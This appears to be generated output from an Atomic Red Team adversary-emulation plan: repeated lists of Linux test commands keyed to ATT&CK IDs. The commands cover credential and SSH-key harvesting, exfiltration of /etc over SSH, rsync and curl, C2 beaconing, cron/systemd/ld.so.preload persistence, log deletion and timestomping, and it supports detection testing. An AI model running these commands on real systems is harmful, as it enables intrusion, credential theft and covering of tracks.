Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1168 ,T1153 ,T1139 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1153 ,T1081 ,T1217 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1136 ,T1153 ,T1040 ,T1135 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1064 ,T1139 ,T1135 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1136 ,T1064 ,T1139 ,T1087 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1168 ,T1154 ,T1139 ,T1135 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1064 ,T1139 ,T1087 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1154 ,T1145 ,T1217 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1501 ,T1153 ,T1139 ,T1018 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1501 ,T1153 ,T1040 ,T1057 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1215 ,T1154 ,T1145 ,T1082 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1154 ,T1145 ,T1087 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1158 ,T1064 ,T1145 ,T1082 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1501 ,T1064 ,T1145 ,T1057 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


